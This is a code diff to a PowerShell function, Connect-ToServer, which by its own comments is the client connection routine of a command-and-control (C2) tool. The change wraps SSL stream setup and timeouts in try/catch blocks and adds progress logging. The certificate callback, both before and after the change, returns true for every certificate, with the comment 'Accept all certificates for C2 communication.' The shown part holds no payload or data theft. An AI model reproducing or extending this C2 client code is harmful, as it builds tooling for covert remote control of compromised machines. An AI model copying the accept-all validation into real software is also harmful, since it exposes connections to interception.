@@ -162,24 +162,39 @@ function Connect-ToServer {
         $socket.LingerState = New-Object System.Net.Sockets.LingerOption($true, 1)
         
         # Get the network stream
+        Write-Host "[*] Getting network stream..." -ForegroundColor Gray
         $networkStream = $global:tcpClient.GetStream()
+        Write-Host "[+] Network stream obtained" -ForegroundColor Gray
         
         # Create SSL stream with proper certificate validation callback
-        Write-Host "[*] Initializing TLS handshake..." -ForegroundColor Yellow
-        $global:sslStream = New-Object System.Net.Security.SslStream(
-            $networkStream, 
-            $false, 
-            ([System.Net.Security.RemoteCertificateValidationCallback] {
-                param($sender, $certificate, $chain, $sslPolicyErrors)
-                # Accept all certificates for C2 communication
-                Write-Host "[*] Certificate validation bypassed (C2 mode)" -ForegroundColor Gray
-                return $true
-            })
-        )
+        Write-Host "[*] Creating SSL stream..." -ForegroundColor Yellow
+        try {
+            $global:sslStream = New-Object System.Net.Security.SslStream(
+                $networkStream, 
+                $false, 
+                ([System.Net.Security.RemoteCertificateValidationCallback] {
+                    param($sender, $certificate, $chain, $sslPolicyErrors)
+                    # Accept all certificates for C2 communication
+                    Write-Host "[*] Certificate validation bypassed (C2 mode)" -ForegroundColor Gray
+                    return $true
+                })
+            )
+            Write-Host "[+] SSL stream created successfully" -ForegroundColor Green
+        } catch {
+            Write-Host "[!] Failed to create SSL stream: $($_.Exception.Message)" -ForegroundColor Red
+            throw "SSL stream creation failed: $($_.Exception.Message)"
+        }
         
         # Set SSL stream timeouts
-        $global:sslStream.ReadTimeout = 5000
-        $global:sslStream.WriteTimeout = 10000
+        Write-Host "[*] Setting SSL stream timeouts..." -ForegroundColor Gray
+        try {
+            $global:sslStream.ReadTimeout = 5000
+            $global:sslStream.WriteTimeout = 10000
+            Write-Host "[+] SSL stream timeouts set successfully" -ForegroundColor Gray
+        } catch {
+            Write-Host "[!] Failed to set SSL stream timeouts: $($_.Exception.Message)" -ForegroundColor Red
+            throw "Failed to set SSL stream timeouts: $($_.Exception.Message)"
+        }
         
         # Perform TLS handshake - ONLY TLS 1.2/1.3, NO FALLBACKS
         Write-Host "[*] Performing TLS handshake with server..." -ForegroundColor Yellow
